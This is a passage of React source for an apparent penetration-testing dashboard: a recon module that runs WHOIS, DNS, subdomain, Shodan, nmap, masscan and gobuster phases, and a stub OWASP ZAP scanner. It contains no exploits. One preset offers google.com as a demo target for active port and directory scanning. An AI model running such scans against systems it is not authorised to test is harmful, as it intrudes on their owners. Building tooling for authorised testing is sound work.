    const active = RECON_PHASES.map((ph,i)=>({ph,i})).filter(({i})=>selectedPhases.has(i));
    // Warn loudly when the customer has deselected phases — silent omissions
    // are why "DNS records missing" surprises happen on report 2 of 2.
    if (active.length < RECON_PHASES.length) {
      const skipped = RECON_PHASES.filter((_,i)=>!selectedPhases.has(i)).map(p=>p.name);
      setLines([`[*] Starting recon on: ${target} (${active.length}/${RECON_PHASES.length} phases selected)`,
                `⚠ Skipping ${skipped.length} phase(s): ${skipped.join(", ")} — re-check tiles to include them`]);
    } else {
      setLines([`[*] Starting recon on: ${target} (${active.length} phases, all enabled)`]);
    }
    const results = {};
    // Single-retry-on-failure helper — most transient errors (429, network
    // glitch, brief origin 502) clear on a 3-second pause. Without this, a
    // bad blip permanently drops a phase from the PDF.
    const _callWithRetry = async (ph, body) => {
      try {
        return await api(ph.endpoint,"POST",body,token);
      } catch(e1) {
        add(`  ↻ ${ph.name} failed once — retrying in 3s...`);
        await new Promise(r=>setTimeout(r,3000));
        return await api(ph.endpoint,"POST",body,token);
      }
    };
    for (let idx=0; idx<active.length; idx++) {
      if (stopRef.current) { add("[!] Scan stopped by user after "+idx+" phase(s)."); break; }
      const {ph,i} = active[idx];
      setCurPhase(i);
      add("[*] Phase "+(idx+1)+"/"+active.length+": "+ph.name+" ...");
      try {
        const body = {target};
        if (ph.tool==="shodan") body.api_key = localStorage.getItem("shodanApiKey")||"";
        if (ph.tool==="shodan" && !body.api_key) {
          add("⚠ Shodan: no API key — set it in Settings");
          // Save explicit skip so the PDF coverage shows "no API key" not just missing
          results[ph.tool] = {ok:false, _skipped:true, skipped_reason:"No Shodan API key configured — set in Settings"};
          setAll(Object.assign({},results));
          setDone(p=>[...p,i]); continue;
        }
        const data = await _callWithRetry(ph, body);
        // Stop was clicked while this phase's request was in flight — discard the result.
        if (stopRef.current) { add("[!] Scan stopped by user during phase "+(idx+1)+"."); break; }
        results[ph.tool] = data;
        if      (ph.tool==="whois"      && data.registrar)   add("✓ Registrar: "+data.registrar);
        else if (ph.tool==="dns"        && data.records)     add("✓ DNS: "+Object.values(data.records).flat().length+" record(s) found");
        else if (ph.tool==="dnsrecon"   && data.records)     add("✓ DNSRecon: "+data.records.length+" record(s) discovered");
        else if (ph.tool==="subdomains" && data.subdomains)  add("✓ Subdomains: "+data.subdomains.length+" found");
        else if (ph.tool==="crtsh"      && data.subdomains)  add("✓ crt.sh: "+data.subdomains.length+" cert entries found");
        else if (ph.tool==="amass"      && data.subdomains)  add("✓ Amass: "+data.subdomains.length+" subdomains found");
        else if (ph.tool==="shodan"     && data.ports)       add("✓ Shodan: "+data.ports.length+" port(s), OS: "+(data.os||"unknown"));
        else if (ph.tool==="harvester"  && data.emails)      add("✓ Harvester: "+(data.emails||[]).length+" emails, "+(data.hosts||[]).length+" hosts");
        else if (ph.tool==="masscan"    && data.ports)       add("✓ Masscan: "+data.ports.length+" open port(s)");
        else if (ph.tool==="nmap"       && data.ports)       add("✓ Nmap: "+data.ports.length+" port(s) found");
        else if (ph.tool==="services"   && data.ports)       add("✓ Services: "+data.ports.length+" service(s) detected");
        else if (ph.tool==="os"         && data.os)          add("✓ OS: "+data.os);
        else if (ph.tool==="banner"     && data.banners)     add("✓ Banners: "+Object.keys(data.banners||{}).length+" captured");
        else if (ph.tool==="gobuster"   && data.found)       add("✓ Gobuster: "+data.found.length+" path(s) discovered"+(data.engine==="python-fuzz"?" (pure-Python engine)":""));
        else if (ph.tool==="cve_match"  && data.summary)     add("✓ CVE Match: "+data.summary.total_cves+" CVE(s) — "+data.summary.critical_cves+" critical, "+data.summary.high_cves+" high");
        else if (ph.tool==="subdomain_takeover")              add("✓ Subdomain Takeover: "+(data.total_vulnerable||0)+" vulnerable on "+(data.checked||0)+" checked");
        else if (ph.tool==="waf_cdn")                         add("✓ WAF/CDN: "+((data.detected||[]).length)+" detected — "+((data.detected||[]).map(x=>x.vendor).slice(0,3).join(", ")||"none"));
        else if (ph.tool==="ssl_deep")                        add("✓ SSL/TLS Deep: "+(data.total_vulnerabilities||0)+" issue(s) — "+(data.current_protocol||"no TLS"));
        else add("✓ "+ph.name+" complete");
        setDone(p=>[...p,i]); setAll(Object.assign({},results));
      } catch(e) {
        const msg = e.message||"unknown error";
        const hint = msg.includes("404")?" (endpoint missing — add to main.py)":msg.includes("Failed to fetch")||msg.includes("NetworkError")?" (backend offline)":"";
        add("✗ "+ph.name+" failed: "+msg+hint);
        // CRITICAL: save the error to results so the PDF coverage section
        // can render a FAILED row instead of silently omitting the tool.
        results[ph.tool] = {ok:false, _failed:true, error:msg};
        setAll(Object.assign({},results));
        setFailed(p=>[...p,i]); setDone(p=>[...p,i]);
      }
    }
    if (!stopRef.current) {
      const okCount     = Object.values(results).filter(x=>x && !x._failed && !x._skipped).length;
      const failedCount = Object.values(results).filter(x=>x && x._failed).length;
      const skipCount   = Object.values(results).filter(x=>x && x._skipped).length;
      add(`✓ Recon complete — ${okCount} ok, ${failedCount} failed, ${skipCount} skipped (${active.length} attempted)`);
    }
    setCurPhase(-1); setRunning(false); _notifyRunning(false); setFinished(true);
  };

  const S = {
    card:    {background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:16,marginBottom:12},
    label:   {fontSize:11,color:"#64748b",fontWeight:600,marginBottom:4},
    val:     {fontSize:13,color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace"},
    th:      {background:"#1e293b",padding:"7px 10px",fontSize:11,color:"#94a3b8",fontWeight:700,textAlign:"left"},
    td:      {padding:"6px 10px",fontSize:12,color:"#e2e8f0",borderBottom:"1px solid #0f172a"},
    tdMono:  {padding:"6px 10px",fontSize:11,color:"#38bdf8",fontFamily:"JetBrains Mono,monospace",borderBottom:"1px solid #0f172a"},
    badge:   (c) => ({background:c+"22",color:c,border:"1px solid "+c+"55",borderRadius:4,padding:"2px 8px",fontSize:10,fontWeight:700}),
    tabBtn:  (active) => ({background:active?"#1e3a8a":"transparent",border:"none",borderBottom:active?"2px solid #3b82f6":"2px solid transparent",color:active?"#60a5fa":"#64748b",padding:"8px 16px",fontSize:12,fontWeight:active?700:400,cursor:"pointer"}),
    section: {background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:6,padding:14,marginBottom:10},
  };

  // ── Results renderer ───────────────────────────────────────────
  const renderResults = () => {
    if (!finished && Object.keys(allResults).length===0) return (
      <div style={{color:"#475569",fontSize:13,padding:24,textAlign:"center"}}>Run a scan to see results here.</div>
    );
    const r = allResults;
    const findings = synthesizeReconFindings(r);
    return (
      <div>
        {/* Findings — severity-ranked actionable risks */}
        {findings.length > 0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#fca5a5",marginBottom:10}}>
              🛡️ Findings — {findings.length} risk{findings.length>1?"s":""} (
              {findings.filter(f=>f.severity==="CRITICAL").length} critical,{" "}
              {findings.filter(f=>f.severity==="HIGH").length} high,{" "}
              {findings.filter(f=>f.severity==="MEDIUM").length} medium,{" "}
              {findings.filter(f=>f.severity==="LOW").length} low)
            </div>
            {findings.slice(0,25).map((f,i)=>{
              const sevColor = f.severity==="CRITICAL"?"#dc2626":f.severity==="HIGH"?"#ea580c":f.severity==="MEDIUM"?"#ca8a04":"#64748b";
              return (
                <div key={i} style={{background:"#020617",border:"1px solid #1e293b",borderLeft:`3px solid ${sevColor}`,borderRadius:5,padding:"10px 12px",marginBottom:8}}>
                  <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:6,gap:10}}>
                    <span style={{fontSize:12,fontWeight:700,color:"#e2e8f0",lineHeight:1.3}}>{i+1}. {f.title}</span>
                    <span style={S.badge(sevColor)}>{f.severity} · CVSS {f.cvss||"?"}</span>
                  </div>
                  <div style={{fontSize:11,color:"#94a3b8",lineHeight:1.4,marginBottom:6}}>{f.description}</div>
                  {f.evidence && (
                    <div style={{fontSize:10,color:"#64748b",fontFamily:"JetBrains Mono,monospace",marginBottom:4}}>
                      <span style={{color:"#94a3b8",fontWeight:700}}>Evidence: </span>{f.evidence}
                    </div>
                  )}
                  {f.remediation && (
                    <div style={{fontSize:10,color:"#86efac",marginBottom:4}}>
                      <span style={{fontWeight:700}}>Fix: </span>{f.remediation}
                    </div>
                  )}
                  {f.references && (
                    <div style={{fontSize:9,color:"#475569",fontStyle:"italic"}}>Refs: {f.references}</div>
                  )}
                </div>
              );
            })}
            {findings.length > 25 && (
              <div style={{fontSize:11,color:"#475569",textAlign:"center",marginTop:6}}>... and {findings.length-25} more findings (top 25 shown)</div>
            )}
          </div>
        )}

        {/* WHOIS */}
        {r.whois && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🌐 WHOIS</div>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
              {[["Domain",r.whois.domain],["Registrar",r.whois.registrar],["Created",r.whois.created],["Expires",r.whois.expires],["Updated",r.whois.updated],["Name Servers",(r.whois.name_servers||[]).join(", ")],["Registrant",r.whois.registrant],["Country",r.whois.country]].filter(([,v])=>v).map(([k,v],i)=>(
                <div key={i} style={S.card}>
                  <div style={S.label}>{k}</div>
                  <div style={S.val}>{String(v).substring(0,80)}</div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* DNS Records */}
        {r.dns && r.dns.records && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🔎 DNS Records</div>
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead><tr><th style={S.th}>TYPE</th><th style={S.th}>RECORD</th></tr></thead>
              <tbody>
                {Object.entries(r.dns.records).flatMap(([type,vals])=>
                  (Array.isArray(vals)?vals:[vals]).map((v,i)=>(
                    <tr key={type+i}>
                      <td style={{...S.td,width:60}}><span style={S.badge("#3b82f6")}>{type}</span></td>
                      <td style={S.tdMono}>{String(v)}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}

        {/* DNS Recon */}
        {r.dnsrecon && r.dnsrecon.records && r.dnsrecon.records.length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🕵️ DNS Recon</div>
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead><tr><th style={S.th}>TYPE</th><th style={S.th}>NAME</th><th style={S.th}>VALUE</th></tr></thead>
              <tbody>
                {r.dnsrecon.records.slice(0,40).map((rec,i)=>(
                  <tr key={i}>
                    <td style={{...S.td,width:60}}><span style={S.badge("#8b5cf6")}>{rec.type||"REC"}</span></td>
                    <td style={S.tdMono}>{rec.name||rec.target||"—"}</td>
                    <td style={S.tdMono}>{rec.address||rec.value||rec.strings||"—"}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Subdomains */}
        {r.subdomains && r.subdomains.subdomains && r.subdomains.subdomains.length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🌍 Subdomains ({r.subdomains.subdomains.length})</div>
            <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:6}}>
              {r.subdomains.subdomains.slice(0,60).map((s,i)=>(
                <div key={i} style={{background:"#020617",border:"1px solid #1e293b",borderRadius:4,padding:"5px 8px",fontSize:11,color:"#38bdf8",fontFamily:"JetBrains Mono,monospace"}}>{s}</div>
              ))}
            </div>
          </div>
        )}

        {/* TheHarvester */}
        {r.harvester && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🔬 OSINT Harvester</div>
            {(r.harvester.emails||[]).length>0 && (
              <>
                <div style={{fontSize:11,color:"#94a3b8",fontWeight:700,marginBottom:6}}>EMAILS FOUND</div>
                <div style={{display:"flex",flexWrap:"wrap",gap:4,marginBottom:10}}>
                  {r.harvester.emails.map((e,i)=><span key={i} style={S.badge("#f59e0b")}>{e}</span>)}
                </div>
              </>
            )}
            {(r.harvester.hosts||[]).length>0 && (
              <>
                <div style={{fontSize:11,color:"#94a3b8",fontWeight:700,marginBottom:6}}>HOSTS / IPs</div>
                <div style={{display:"flex",flexWrap:"wrap",gap:4}}>
                  {r.harvester.hosts.map((h,i)=><span key={i} style={S.badge("#22c55e")}>{h}</span>)}
                </div>
              </>
            )}
            {(r.harvester.emails||[]).length===0 && (r.harvester.hosts||[]).length===0 && (
              <div style={{color:"#475569",fontSize:12}}>No emails or hosts found.</div>
            )}
          </div>
        )}

        {/* Ports — masscan + nmap combined */}
        {(r.masscan||r.nmap) && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🔌 Open Ports</div>
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead><tr><th style={S.th}>PORT</th><th style={S.th}>PROTO</th><th style={S.th}>STATE</th><th style={S.th}>SOURCE</th></tr></thead>
              <tbody>
                {[...((r.masscan&&r.masscan.ports)||[]).map(p=>({...p,src:"masscan"})),
                  ...((r.nmap&&r.nmap.ports)||[]).map(p=>({...p,src:"nmap"}))].map((p,i)=>(
                  <tr key={i}>
                    <td style={{...S.tdMono,fontWeight:700}}>{p.port}</td>
                    <td style={S.td}>{p.proto||p.protocol||"tcp"}</td>
                    <td style={S.td}><span style={S.badge(p.state==="open"?"#22c55e":"#64748b")}>{p.state||"open"}</span></td>
                    <td style={S.td}>{p.src}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Services */}
        {r.services && r.services.ports && r.services.ports.length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>⚙️ Services & Versions</div>
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead><tr><th style={S.th}>PORT</th><th style={S.th}>SERVICE</th><th style={S.th}>VERSION</th></tr></thead>
              <tbody>
                {r.services.ports.map((p,i)=>(
                  <tr key={i}>
                    <td style={S.tdMono}>{p.port}</td>
                    <td style={S.td}>{p.service||"—"}</td>
                    <td style={{...S.td,color:"#94a3b8"}}>{p.version||p.product||"—"}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* OS */}
        {r.os && (r.os.os||r.os.matches) && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>💻 OS Fingerprinting</div>
            {r.os.os && <div style={{...S.val,fontSize:15,marginBottom:8}}>{r.os.os}</div>}
            {r.os.accuracy && <div style={{...S.label}}>Confidence: {r.os.accuracy}%</div>}
            {(r.os.matches||[]).slice(0,5).map((m,i)=>(
              <div key={i} style={{...S.card,marginBottom:6,padding:"8px 12px"}}>
                <span style={{color:"#e2e8f0",fontSize:12}}>{m.name||m}</span>
                {m.accuracy && <span style={{...S.badge("#3b82f6"),marginLeft:8}}>{m.accuracy}%</span>}
              </div>
            ))}
          </div>
        )}

        {/* Banners */}
        {r.banner && r.banner.banners && Object.keys(r.banner.banners).length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🏷️ Service Banners</div>
            {Object.entries(r.banner.banners).map(([port,banner],i)=>(
              <div key={i} style={{marginBottom:8}}>
                <div style={{...S.badge("#8b5cf6"),display:"inline-block",marginBottom:4}}>Port {port}</div>
                <div style={{background:"#020617",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",fontFamily:"JetBrains Mono,monospace",fontSize:11,color:"#a3e635",whiteSpace:"pre-wrap",wordBreak:"break-all"}}>{String(banner).substring(0,200)}</div>
              </div>
            ))}
          </div>
        )}

        {/* crt.sh */}
        {r.crtsh && r.crtsh.subdomains && r.crtsh.subdomains.length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>📜 Certificate Transparency — crt.sh ({r.crtsh.subdomains.length})</div>
            <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:6}}>
              {r.crtsh.subdomains.slice(0,60).map((s,i)=>(
                <div key={i} style={{background:"#020617",border:"1px solid #1e293b",borderRadius:4,padding:"5px 8px",fontSize:11,color:"#a78bfa",fontFamily:"JetBrains Mono,monospace"}}>{s}</div>
              ))}
            </div>
          </div>
        )}

        {/* Amass */}
        {r.amass && r.amass.subdomains && r.amass.subdomains.length>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>🕸️ Amass — Deep Subdomain Recon ({r.amass.subdomains.length})</div>
            <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:6}}>
              {r.amass.subdomains.slice(0,60).map((s,i)=>(
                <div key={i} style={{background:"#020617",border:"1px solid #1e293b",borderRadius:4,padding:"5px 8px",fontSize:11,color:"#34d399",fontFamily:"JetBrains Mono,monospace"}}>{s}</div>
              ))}
            </div>
          </div>
        )}

        {/* Shodan */}
        {r.shodan && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10}}>👁️ Shodan Intelligence</div>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:12}}>
              {[["IP",r.shodan.ip],["Organization",r.shodan.org],["ISP",r.shodan.isp],["Country",r.shodan.country],["City",r.shodan.city],["OS",r.shodan.os]].filter(([,v])=>v).map(([k,v],i)=>(
                <div key={i} style={S.card}><div style={S.label}>{k}</div><div style={S.val}>{String(v)}</div></div>
              ))}
            </div>
            {r.shodan.ports && r.shodan.ports.length>0 && (
              <>
                <div style={{fontSize:11,color:"#94a3b8",fontWeight:700,marginBottom:6}}>OPEN PORTS</div>
                <div style={{display:"flex",flexWrap:"wrap",gap:6,marginBottom:10}}>
                  {r.shodan.ports.map((p,i)=><span key={i} style={S.badge("#f59e0b")}>{p}</span>)}
                </div>
              </>
            )}
            {r.shodan.vulns && r.shodan.vulns.length>0 && (
              <>
                <div style={{fontSize:11,color:"#f87171",fontWeight:700,marginBottom:6}}>KNOWN VULNERABILITIES</div>
                <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
                  {r.shodan.vulns.map((v,i)=><span key={i} style={S.badge("#ef4444")}>{v}</span>)}
                </div>
              </>
            )}
            {r.shodan.tags && r.shodan.tags.length>0 && (
              <div style={{marginTop:10,display:"flex",flexWrap:"wrap",gap:6}}>
                {r.shodan.tags.map((t,i)=><span key={i} style={S.badge("#3b82f6")}>{t}</span>)}
              </div>
            )}
          </div>
        )}

        {/* CVE Matches (NVD) */}
        {r.cve_match && r.cve_match.summary && (r.cve_match.summary.total_cves||0)>0 && (
          <div style={S.section}>
            <div style={{fontSize:13,fontWeight:700,color:"#ef4444",marginBottom:10}}>🚨 CVE Matches — {r.cve_match.summary.total_cves} found ({r.cve_match.summary.critical_cves} critical, {r.cve_match.summary.high_cves} high, {r.cve_match.summary.medium_cves||0} medium)</div>
            {(r.cve_match.services_detected||[]).length>0 && (
              <div style={{fontSize:11,color:"#94a3b8",marginBottom:10}}>
                Services: {(r.cve_match.services_detected||[]).map(s=>`${s.vendor}/${s.product} ${s.version}`).join(", ")}
              </div>
            )}
            {(r.cve_match.cves||[]).slice(0,20).map((c,i)=>(
              <div key={i} style={{background:"#020617",border:"1px solid #1e293b",borderRadius:5,padding:"8px 12px",marginBottom:6}}>
                <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:4}}>
                  <span style={{fontFamily:"JetBrains Mono,monospace",fontSize:11,color:"#fca5a5",fontWeight:700}}>{c.id}</span>
                  <span style={S.badge(c.cvss_severity==="CRITICAL"?"#dc2626":c.cvss_severity==="HIGH"?"#ea580c":c.cvss_severity==="MEDIUM"?"#ca8a04":"#64748b")}>{c.cvss_severity} · CVSS {c.cvss_score ?? "?"}</span>
                </div>
                <div style={{fontSize:11,color:"#94a3b8",lineHeight:1.4}}>{String(c.description||"").substring(0,200)}</div>
              </div>
            ))}
            {(r.cve_match.cves||[]).length>20 && (
              <div style={{fontSize:11,color:"#475569",marginTop:8,textAlign:"center"}}>... and {r.cve_match.cves.length-20} more CVEs (top 20 shown)</div>
            )}
          </div>
        )}
      </div>
    );
  };

  // ── PDF export ─────────────────────────────────────────────────
  const dlReconPDF = () => generateReconReport({target, allResults, date: new Date().toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"})+" "+new Date().toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit"})});

  return (
    <div className="fade">
      {/* Header */}
      <div style={{background:"linear-gradient(135deg,#0c1a3d,#0f172a)",border:"1px solid #1e3a8a",borderRadius:8,padding:20,marginBottom:16}}>
        <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:6,flexWrap:"wrap"}}>
          <span style={{fontSize:20}}>🔍</span>
          <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9"}}>Information Gathering & Recon</h2>
          <Badge label={RECON_PHASES.length+" PHASES"} color="blue"/>
          <Badge label="PASSIVE + ACTIVE" color="green"/>
          {finished && <Badge label="DONE" color="green"/>}
        </div>
        <p style={{fontSize:12,color:"#64748b",marginBottom:16}}>
          WHOIS · DNS · subdomains · cert transparency · OSINT · Shodan · port scan · service detection · OS fingerprinting · banners · directory enum
        </p>

        {/* Target + controls */}
        <TestTargets onSelect={setTarget} targets={[
          {icon:"📡",label:"Scanme (nmap)",       value:"scanme.nmap.org",      desc:"nmap test server — safe to scan"},
          {icon:"💀",label:"Metasploitable",      value:"lab_metasploitable",   desc:"🟢 Live Docker — many open ports"},
          {icon:"🌐",label:"example.com",         value:"example.com",          desc:"IANA test domain — public WHOIS/DNS"},
          {icon:"🔍",label:"google.com",          value:"google.com",           desc:"Demo target — full report"},
        ]}/>
        <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
          <input value={target} onChange={e=>setTarget(e.target.value)}
            onKeyDown={e=>e.key==="Enter"&&!running&&run()}
            placeholder="domain.com  or  192.168.1.1  or  192.168.1.0/24"
            style={{flex:3,minWidth:240,background:"#020617",border:"1px solid #1e3a8a",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none"}}/>
          <button onClick={run} disabled={running||!target.trim()}
            style={{background:running?"#1e293b":"linear-gradient(135deg,#3b82f6,#06b6d4)",border:"none",borderRadius:6,padding:"10px 24px",color:running?"#475569":"#fff",fontSize:13,fontWeight:700,cursor:running?"not-allowed":"pointer"}}>
            {running?"Running...":"Start Recon"}
          </button>
          {running && (
            <button onClick={stop} disabled={stopped}
              style={{background:"linear-gradient(135deg,#dc2626,#991b1b)",border:"none",borderRadius:6,padding:"10px 22px",color:"#fff",fontSize:13,fontWeight:700,cursor:stopped?"not-allowed":"pointer",opacity:stopped?0.5:1}}>
              ■ Stop
            </button>
          )}
        </div>
      </div>

      {/* Phase selector */}
      <div style={{background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:8,padding:14,marginBottom:16}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:10}}>
          <span style={{fontSize:11,fontWeight:700,color:"#64748b",letterSpacing:1,textTransform:"uppercase"}}>Select Phases</span>
          <div style={{display:"flex",gap:8}}>
            <button onClick={()=>setSelected(new Set(RECON_PHASES.map((_,i)=>i)))} style={{background:"none",border:"1px solid #1e293b",borderRadius:4,padding:"3px 10px",color:"#60a5fa",fontSize:11,cursor:"pointer"}}>All</button>
            <button onClick={()=>setSelected(new Set())} style={{background:"none",border:"1px solid #1e293b",borderRadius:4,padding:"3px 10px",color:"#64748b",fontSize:11,cursor:"pointer"}}>None</button>
          </div>
        </div>
        <div style={{display:"flex",flexDirection:"column",gap:8,width:"100%"}}>
          {RECON_PHASES.map((ph,i)=>{
            const sel       = selectedPhases.has(i);
            const isDone    = done.includes(i);
            const isFailed  = failed.includes(i);
            const isActive  = curPhase===i;
            const leftCol   = isActive?"#3b82f6":isDone?(isFailed?"#ef4444":"#22c55e"):"#334155";
            const borderCol = isActive?"#1e3a8a":isDone?(isFailed?"#450a0a":"#052e16"):"#1e293b";
            return (
              <div key={i} onClick={()=>!running&&togglePhase(i)}
                style={{background:"#0f172a",border:"1px solid "+borderCol,borderLeft:`4px solid ${leftCol}`,borderRadius:6,padding:"10px 16px",display:"flex",alignItems:"center",gap:12,width:"100%",cursor:running?"default":"pointer",opacity:sel?1:0.4,transition:"all 0.2s",boxSizing:"border-box"}}>
                <span style={{fontSize:18,flexShrink:0,width:24,textAlign:"center"}}>{ph.icon}</span>
                <span style={{flex:1,fontSize:13,fontWeight:600,color:isActive?"#93c5fd":isDone&&!isFailed?"#4ade80":isFailed?"#f87171":sel?"#cbd5e1":"#64748b"}}>{ph.name}</span>
                <span style={{fontSize:10,color:"#334155",fontFamily:"JetBrains Mono,monospace",background:"#020617",border:"1px solid #1e293b",borderRadius:3,padding:"2px 8px"}}>{ph.tool}</span>
                {isActive && <span style={{fontSize:10,color:"#93c5fd",fontWeight:600,minWidth:60,textAlign:"right"}}>Running…</span>}
                {isDone && <span style={{fontSize:14,color:isFailed?"#f87171":"#4ade80",fontWeight:700,minWidth:60,textAlign:"right"}}>{isFailed?"✗ ERROR":"✓ DONE"}</span>}
              </div>
            );
          })}
        </div>
      </div>

      {/* Tabs */}
      <div style={{background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
        <div style={{display:"flex",borderBottom:"1px solid #1e293b",alignItems:"center"}}>
          {[["phases","📡 Live Log"],["results","📊 Results"]].map(([t,l])=>(
            <button key={t} onClick={()=>setTab(t)} style={S.tabBtn(tab===t)}>{l}</button>
          ))}
          {finished && (
            <button onClick={dlReconPDF} style={{marginLeft:"auto",marginRight:12,background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
              📄 Report
            </button>
          )}
        </div>

        <div style={{padding:16}}>
          {/* Live log */}
          {tab==="phases" && (
            <div ref={logRef} style={{background:"#020617",borderRadius:6,padding:12,height:320,overflowY:"auto",fontFamily:"JetBrains Mono,monospace",fontSize:11}}>
              {lines.map((l,i)=>{
                const c = l.startsWith("✗")?"#f87171":l.startsWith("✓")?"#4ade80":l.startsWith("[!")?"#fbbf24":"#94a3b8";
                return <div key={i} style={{color:c,marginBottom:2,lineHeight:1.5}}>{l}</div>;
              })}
              {running && <div style={{color:"#60a5fa",animation:"pulse 1s infinite"}}>▌</div>}
            </div>
          )}

          {/* Results */}
          {tab==="results" && renderResults()}
        </div>
      </div>
    </div>
  );
}

function ZAPModule({token}) { // kept as stub to avoid reference errors — not rendered
  const [target,   setTarget]   = useState("");
  const [scanType, setScanType] = useState("quick");
  const [scanning, setScanning] = useState(false);
  const [result,   setResult]   = useState(null);
  const [lines,    setLines]    = useState(["Ready — enter target and run OWASP ZAP scan"]);
  const add = l => setLines(p => [...p, l]);

  const run = async () => {
    if (!target.trim()) return;
    setScanning(true); setResult(null);
    setLines([`[*] Starting OWASP ZAP ${scanType} scan on ${target}...`]);
    add("[*] ZAP initializing — this may take 2–5 minutes...");
    try {
      const data = await api("/api/scan/zap","POST",{target,scan_type:scanType,options:{scan_type:scanType}},token);
      setResult(data);
      add(`[✓] ZAP scan complete — ${data.total} alert(s) found`);
      if(data.findings?.length>0){
        const h=data.findings.filter(f=>f.severity==="HIGH"||f.severity==="CRITICAL").length;
        const m=data.findings.filter(f=>f.severity==="MEDIUM").length;
        add(`[!] High/Critical: ${h}  Medium: ${m}`);
      } else { add("[✓] No vulnerabilities detected"); }
    } catch(e) {
      add(`[✗] Error: ${e.message}`);
      if(e.message.toLowerCase().includes("not installed")||e.message.includes("404"))
        add("[!] Install ZAP first: sudo apt install zaproxy -y");
    }
    setScanning(false);
  };

  const sevColor = s => ({CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",INFO:"#64748b"}[s]||"#64748b");

  return (
    <div className="fade">
      {/* Header */}
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:20,marginBottom:16}}>
        <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:4}}>
          <span style={{fontSize:22}}>🔬</span>
          <div>
            <h2 style={{fontSize:15,fontWeight:700,color:"#f1f5f9",margin:0}}>OWASP ZAP Scanner</h2>
            <p style={{fontSize:11,color:"#64748b",margin:0}}>Industry-standard automated web vulnerability scanner</p>
          </div>
          <span style={{marginLeft:"auto",background:"#052e16",color:"#4ade80",fontSize:10,padding:"3px 10px",borderRadius:4,fontWeight:700,border:"1px solid #166534"}}>FREE TOOL</span>
        </div>

        {/* Info cards */}
        <div style={{display:"flex",gap:8,marginBottom:16,flexWrap:"wrap"}}>
          {[
            {icon:"🕷️",label:"Spider",desc:"Crawls all pages"},
            {icon:"⚡",label:"Active Scan",desc:"Tests all parameters"},
            {icon:"📋",label:"OWASP Mapped",desc:"Top 10 coverage"},
            {icon:"🎯",label:"CVE/CWE",desc:"Tagged findings"},
          ].map((c,i)=>(
            <div key={i} style={{background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:6,padding:"8px 12px",flex:1,minWidth:100}}>
              <div style={{fontSize:16,marginBottom:2}}>{c.icon}</div>
              <div style={{fontSize:11,fontWeight:700,color:"#e2e8f0"}}>{c.label}</div>
              <div style={{fontSize:10,color:"#64748b"}}>{c.desc}</div>
            </div>
          ))}
        </div>

        {/* Controls */}
        <TestTargets onSelect={setTarget} targets={[
          {icon:"🔴",label:"DVWA",          value:"http://lab_dvwa",                    desc:"🟢 Live Docker — SQLi, XSS, CSRF, File Upload, LFI. Login: admin/password"},
          {icon:"🐐",label:"WebGoat",        value:"http://lab_webgoat:8080/WebGoat",       desc:"🟢 Live Docker — OWASP WebGoat guided lessons"},
